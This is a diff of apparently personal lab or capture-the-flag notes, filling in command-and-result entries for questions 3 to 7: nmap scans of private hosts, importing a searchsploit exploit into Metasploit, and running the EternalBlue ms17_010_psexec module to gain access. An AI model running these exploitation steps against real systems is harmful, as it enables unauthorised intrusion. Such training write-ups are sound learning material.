@@ -739,31 +739,38 @@ end
 - cat /etc/hosts
 - nmap -sC -sV -Pn 172.16.1.12
   
-*Result:* Distro = Flag 3
+*Result:* Distro = question 3
 
 ---
 
-*Command:* 
+*Command:* Inside the file
 
-*Result:* 
-
----
-
-*Command:* 
-
-*Result:* 
+*Result:* question 4
 
 ---
 
-*Command:* 
-
-*Result:* 
+*Command:* Upload module to metasploit + use exploit
+- searchsploit -m 50064
+- mkdir -p msf4/modules/exploit/php/webapps
+- cp 50064.rb msf4/modules/exploit/php/webapps
+- msfconsole -q + use 50064 + set VHOST/RHOST/PASSWORD/USERNAME
+  
+*Result:* Question 5 
 
 ---
 
-*Command:* 
+*Command:* Network scan reveals a keyword for the exploit
+- nmap -sC -sV -Pn 172.16.1.13
 
-*Result:* 
+*Result:* An important configuration name = Question 6
+
+---
+
+*Command:* Use metasploit module EternalBlue
+- use exploit/windows/smb/ms17_010_psexec
+- set LHOST,RHOST + run
+
+*Result:* Access to target = question 7
 
 ---
 
